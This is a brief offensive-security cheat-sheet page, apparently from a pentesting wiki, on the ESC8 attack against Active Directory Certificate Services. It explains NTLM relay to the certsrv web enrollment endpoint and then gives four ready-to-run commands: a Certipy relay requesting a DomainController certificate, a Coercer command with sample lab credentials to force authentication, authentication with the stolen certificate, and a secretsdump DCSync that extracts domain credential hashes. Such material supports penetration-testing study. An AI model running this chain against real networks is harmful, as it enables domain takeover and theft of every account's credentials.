---
description: ADCS abuse with NTLM Relay
---

# ESC8

NTLM Relay is a MitM attack where an attacker pretends to be the server for the client and vice versa. ADCS support enrollment over HTTP which allows users to request certificates over HTTP.

We can relay HTTP NTLM authentication to a certificate enrollment interface. CA's web enrollment service provides web pages to interact with CA. Usually at `http://<servername>/certsrv/certfnsh.asp`. These endpoints can be abused using authenicated sessions through NTLM Relay.

### <mark style="color:yellow;">ESC8 Abuse</mark>

Start listening with Certipy

```sh
sudo certipy relay -target 172.16.19.5 -template DomainController
```

Then coerce using printerbug, petitpotam or coercer.

```sh
coercer coerce -l 172.16.19.19 -t 172.16.19.3 -u blwasp -p 'Password123!' -d lab.local -v
```

Authenticate

```sh
certipy auth -pfx lab-dc.pfx
```

DCSync

```shell-session
KRB5CCNAME=lab-dc.ccache secretsdump.py -k -no-pass lab-dc.lab.local
```
